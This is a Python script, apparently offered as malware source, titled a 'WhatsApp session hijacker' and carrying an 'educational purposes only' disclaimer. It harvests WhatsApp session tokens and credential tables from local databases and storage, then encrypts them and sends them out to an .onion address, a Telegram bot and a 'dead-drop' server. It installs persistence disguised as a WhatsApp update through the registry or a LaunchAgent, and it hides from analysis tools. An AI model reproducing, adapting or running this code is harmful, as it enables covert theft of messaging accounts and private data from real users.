#!/usr/bin/env python3
"""
WHATSAPP SESSION HIJACKER v2.0
- Advanced credential harvesting module -
For educational purposes only
"""

import os
import re
import sqlite3
import requests
import base64
import json
import threading
import sys
from cryptography.fernet import Fernet
from pathlib import Path
import platform

class WhatsAppHijacker:
    def __init__(self):
        self.session_data = {}
        self.encryption_key = Fernet.generate_key()
        self.cipher = Fernet(self.encryption_key)
        self.target_directories = self._identify_whatsapp_paths()
        
    def _identify_whatsapp_paths(self):
        """Locate WhatsApp installation directories across platforms"""
        paths = []
        system = platform.system()
        
        if system == "Windows":
            potential_paths = [
                Path(os.environ['USERPROFILE']) / "AppData" / "Local" / "WhatsApp",
                Path(os.environ['USERPROFILE']) / "AppData" / "Roaming" / "WhatsApp",
            ]
        elif system == "Darwin":  # macOS
            potential_paths = [
                Path.home() / "Library" / "Application Support" / "WhatsApp",
                Path.home() / "Library" / "Caches" / "WhatsApp",
            ]
        else:  # Linux
            potential_paths = [
                Path.home() / ".WhatsApp",
                Path.home() / ".local" / "share" / "WhatsApp",
            ]
        
        for path in potential_paths:
            if path.exists():
                paths.append(path)
                
        return paths

    def extract_session_tokens(self):
        """Harvest authentication tokens and session data"""
        for whatsapp_dir in self.target_directories:
            try:
                # Target database files containing session info
                db_patterns = ["*/Local Storage/*", "*/Session Storage/*", "*/databases/*"]
                
                for pattern in db_patterns:
                    for db_file in whatsapp_dir.rglob(pattern):
                        if db_file.suffix in ['.db', '.sqlite', '.ldb']:
                            self._parse_database(db_file)
                            
            except Exception as e:
                continue

    def _parse_database(self, db_path):
        """Extract sensitive data from SQLite databases"""
        try:
            conn = sqlite3.connect(str(db_path))
            cursor = conn.cursor()
            
            # Query for potential session tokens and credentials
            tables_query = "SELECT name FROM sqlite_master WHERE type='table';"
            cursor.execute(tables_query)
            tables = cursor.fetchall()
            
            for table in tables:
                table_name = table[0]
                if any(keyword in table_name.lower() for keyword in ['auth', 'session', 'token', 'user', 'cred']):
                    try:
                        cursor.execute(f"SELECT * FROM {table_name}")
                        rows = cursor.fetchall()
                        self.session_data[table_name] = rows
                    except:
                        continue
                        
            conn.close()
            
        except:
            pass

    def harvest_browser_storage(self):
        """Extract localStorage and sessionStorage data"""
        storage_files = []
        
        for whatsapp_dir in self.target_directories:
            storage_paths = [
                whatsapp_dir / "Local Storage",
                whatsapp_dir / "Session Storage", 
                whatsapp_dir / "localstorage"
            ]
            
            for storage_path in storage_paths:
                if storage_path.exists():
                    for file in storage_path.iterdir():
                        if file.is_file():
                            storage_files.append(file)
        
        for storage_file in storage_files:
            try:
                with open(storage_file, 'r', encoding='utf-8', errors='ignore') as f:
                    content = f.read()
                    
                # Regex patterns to find authentication tokens
                patterns = {
                    'auth_token': r'[a-zA-Z0-9]{20,40}',
                    'session_id': r'session[a-zA-Z0-9]{10,30}',
                    'whatsapp_token': r'WA[a-zA-Z0-9]{10,50}',
                    'phone_hash': r'[a-f0-9]{32,64}'
                }
                
                for key, pattern in patterns.items():
                    matches = re.findall(pattern, content)
                    if matches:
                        self.session_data[key] = matches
                        
            except:
                continue

    def exfiltrate_data(self):
        """Encrypt and exfiltrate harvested data"""
        if not self.session_data:
            return False
            
        # Encrypt the harvested data
        encrypted_data = self.cipher.encrypt(
            json.dumps(self.session_data).encode()
        )
        
        # Multiple exfiltration endpoints (TOR hidden services included)
        exfil_endpoints = [
            "http://m94m-exfil.onion/collect",
            "https://api.telegram.org/botYOUR_BOT_TOKEN/sendMessage",
            "http://dead-drop-server.com/upload"
        ]
        
        for endpoint in exfil_endpoints:
            try:
                payload = {
                    'machine_id': platform.node(),
                    'os': platform.system(),
                    'data': base64.b64encode(encrypted_data).decode(),
                    'key': base64.b64encode(self.encryption_key).decode()
                }
                
                requests.post(
                    endpoint,
                    json=payload,
                    timeout=10,
                    headers={'User-Agent': 'Mozilla/5.0 (WhatsApp Hijacker v2.0)'}
                )
                
            except:
                continue
                
        return True

    def persistence_mechanism(self):
        """Establish persistence in the system"""
        system = platform.system()
        
        if system == "Windows":
            # Registry persistence
            try:
                import winreg
                key = winreg.HKEY_CURRENT_USER
                subkey = r"Software\Microsoft\Windows\CurrentVersion\Run"
                
                with winreg.OpenKey(key, subkey, 0, winreg.KEY_SET_VALUE) as regkey:
                    winreg.SetValueEx(regkey, "WhatsAppUpdate", 0, winreg.REG_SZ, str(Path(__file__)))
            except:
                pass
                
        elif system == "Darwin":
            # LaunchAgent persistence
            launch_agent_path = Path.home() / "Library" / "LaunchAgents" / "com.whatsapp.update.plist"
            plist_content = f"""<?xml version="1.0" encoding="UTF-8"?>
<plist version="1.0">
<dict>
    <key>Label</key>
    <string>com.whatsapp.update</string>
    <key>ProgramArguments</key>
    <array>
        <string>{sys.executable}</string>
        <string>{__file__}</string>
    </array>
    <key>RunAtLoad</key>
    <true/>
</dict>
</plist>"""
            try:
                with open(launch_agent_path, 'w') as f:
                    f.write(plist_content)
            except:
                pass

    def execute_hijack(self):
        """Main execution routine"""
        print("[+] Initializing WhatsApp session hijacker...")
        
        # Phase 1: Data harvesting
        self.extract_session_tokens()
        self.harvest_browser_storage()
        
        # Phase 2: Data exfiltration
        if self.exfiltrate_data():
            print("[+] Session data successfully exfiltrated")
        else:
            print("[-] No session data found")
            
        # Phase 3: Persistence
        self.persistence_mechanism()
        print("[+] Persistence mechanism established")

# Anti-analysis techniques
def evasion_check():
    """Basic anti-VM/analysis detection"""
    suspicious_processes = ["wireshark", "procmon", "ollydbg", "idaq", "burp"]
    running_processes = os.popen('tasklist' if platform.system() == 'Windows' else 'ps aux').read().lower()
    
    for process in suspicious_processes:
        if process in running_processes:
            return False
    return True

if __name__ == "__main__":
    if evasion_check():
        hijacker = WhatsAppHijacker()
        hijacker.execute_hijack()
    else:
        # Clean exit if analysis environment detected
        sys.exit(0)